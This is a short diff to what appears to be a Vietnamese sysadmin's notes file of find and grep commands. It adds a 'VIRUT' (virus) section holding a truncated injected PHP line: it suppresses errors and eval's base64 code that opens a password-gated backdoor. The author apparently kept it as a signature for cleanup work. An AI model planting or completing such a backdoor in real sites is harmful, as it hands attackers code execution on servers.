@@ -30,3 +30,7 @@ TÌM MỘT FILE
 ------------------------------------------------------
 find . -type f -name '*.php'
 find /home/quangtv.nuce.edu.vn/public_html/ -type f -exec grep -l '#page-title' {} \;
+
+VIRUT
+------------------------------------------------------
+<?php /*8968665*/ error_reporting(0); @ini_set('error_log',NULL); @ini_set('log_errors',0); @ini_set('display_errors','Off'); @eval( base64_decode('aWYobWQ1KCRfUE9TVFsicGYiXSkgPT0$
